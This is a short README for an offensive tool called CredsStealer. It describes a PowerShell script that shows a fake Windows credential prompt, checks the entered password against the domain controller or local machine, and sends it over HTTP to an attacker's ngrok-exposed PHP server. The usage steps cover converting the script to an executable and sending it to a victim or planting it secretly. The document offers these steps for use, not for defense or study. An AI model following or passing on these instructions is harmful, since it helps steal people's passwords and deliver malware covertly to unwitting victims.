# CredsStealer
Credsleaker allows an attacker to craft a highly convincing credentials prompt using Windows PromptForCredential, validate it against the DC or localmachine and in turn leak it via an HTTP request.


# How to use
Host index.php on localserver lets say php server on linux or xampp for windows then use ngrok to get link.Copy http version of link and paste in CredsStealer.ps1 after $ngrokServer ex. (http://your-ngrok-link/index.php).Then convert CredsStealer.ps1 using ps1_to_exe and send to victim or upload secretly to victim machine and run it.You'll see the magic.
